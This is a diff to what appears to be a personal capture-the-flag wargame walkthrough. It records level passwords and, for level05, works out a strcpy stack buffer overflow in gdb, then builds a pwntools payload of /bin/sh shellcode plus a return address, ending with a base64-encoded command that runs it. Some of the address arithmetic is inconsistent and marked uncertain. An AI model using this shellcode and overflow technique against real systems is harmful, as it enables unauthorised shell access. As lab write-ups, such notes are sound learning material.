@@ -35,4 +35,69 @@ level04 -> DNLM3Vu0mZfX0pDd
 
   Then export the `PATH` such that it's `export PATH=/tmp:${PATH}`
 
-level05 ->
+level05 -> fQ8W8YlSBJBWKV2R
+
+  gdb-peda$ disass main
+  ...
+  0x080483e5 <+49>:	lea    eax,[ebp-0x88]
+  0x080483eb <+55>:	mov    DWORD PTR [esp],eax
+  0x080483ee <+58>:	call   0x80482d4 <strcpy@plt>
+  ...
+
+  The first call arg to `strcpy` is the buffer, the pointer for which is stored
+  in EAX.  We can see that it's located at EBP-0x88.  EBP is the stack frame
+  pointer.
+
+  The address of the return value register is 1 call before that, it's at 4 bytes
+  ahead.
+
+  So the return address is at -(0x88 + 4) = -140
+
+  You can confirm with:
+  > run $(python3 -c "print('w' * 140 + 'DEAD')")
+  EAX: 0x0
+  EBX: 0x0
+  ECX: 0x7fffff6f
+  EDX: 0xb7fc3870 --> 0x0
+  ESI: 0x2
+  EDI: 0xb7fc2000 --> 0x1b3db0
+  EBP: 0x77777777 ('wwww')
+  ESP: 0xbffffbd0 --> 0x0
+  EIP: 0x44414544 ('DEAD')
+
+  At this point the stack looks like this:
+  [------------------------------------stack-------------------------------------]
+  0000| 0xbffffbcc ("DEAD")
+  0004| 0xbffffbd0 --> 0x0
+
+  We found our canary on the stack at: 0xbffffbcc
+
+  NOW, we need to find the address of the buffer to inject.  That is computed by
+  using the canary address, subtract the buffer length, subtract the pointer to
+  the memory segment (???).
+
+  That is: 0xbffffbec - 0x88 - 4 = 0xbffffb60
+
+  // --
+  // Now we create a program to generate an injection.
+  import base64
+  import pwn
+
+  # From: `pwn shellcraft i386.linux.sh`
+  shellcode = bytes.fromhex('6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80')
+  return_addr = pwn.p32(0xbffffb60)
+
+  payload = shellcode \
+          + return_addr \
+          + ((140 - len(return_addr))  - len(shellcode)) * b'w' \
+          + return_addr
+
+  print(base64.b64encode(payload))
+
+
+  // And we can execute it
+  level05 $(echo 'amhoLy8vc2gvYmluieNoAQEBAYE0JHJpAQExyVFqBFkB4VGJ4THSagtYzYBg+/+/d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3YPv/vw==' | base64 -d)
+
+
+level06 -> U3A6ZtaTub14VmwV
+level07 ->
